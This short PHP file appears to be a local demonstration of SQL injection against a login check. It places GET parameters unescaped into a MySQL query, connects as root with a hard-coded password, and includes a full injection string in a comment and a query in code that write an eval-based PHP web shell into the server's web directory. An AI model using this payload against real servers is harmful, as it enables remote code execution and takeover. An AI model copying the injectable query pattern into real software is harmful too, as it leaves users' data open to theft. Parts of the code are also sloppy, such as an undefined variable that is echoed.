<?php



$username = $_GET['username'];
$password = $_GET['password'];

$mysqli = mysqli_connect("localhost", 'root', 'root', 'Test');
mysqli_set_charset($mysqli,'utf-8');
$sql = "select * from demo where username = '{$username}' AND password = '{$password}'";
$a1='$_GET[\"a\"]';
$sql2 = "select '<?php eval(".$a1.") ?>' into outfile \"D:/phpStudy/PHPTutorial/WWW/exec.php\";#";
/*	注入字符串  ' or 1=1 ;select '<?php eval($_GET["a"]) ?>' into outfile "D:/phpStudy/PHPTutorial/WWW/exec.php";%23  */
echo $xss . "\n<br />";
$mysqli_result = mysqli_query($mysqli, $sql);
var_dump($mysqli_result);
//echo "<br/>";
var_dump(mysqli_error($mysqli));
$arr = $mysqli_result->fetch_assoc();
if (count($arr)>0){
    echo "用户登录";
}else{
    echo "登录失败";
}

